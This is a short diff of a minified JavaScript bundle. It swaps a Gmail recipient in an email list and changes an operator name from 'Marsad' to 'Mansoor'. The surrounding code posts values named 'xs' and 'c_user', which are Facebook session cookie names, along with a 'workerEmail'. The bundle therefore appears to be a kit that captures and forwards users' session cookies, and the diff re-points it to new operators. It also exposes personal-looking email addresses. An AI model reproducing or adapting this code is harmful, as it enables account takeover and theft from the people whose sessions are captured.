@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["mjohn72929@gmail.com","info.amandajames478@gmail.com"],
+            l = ["mjohn72929@gmail.com","bajwarubina128@gmail.com"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10383,7 +10383,7 @@
                                 workerEmail: "mjohn72929@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                name: "Marsad",
+                                name: "Mansoor",
                               }),
                             }).then((e) => {
                               e.ok;
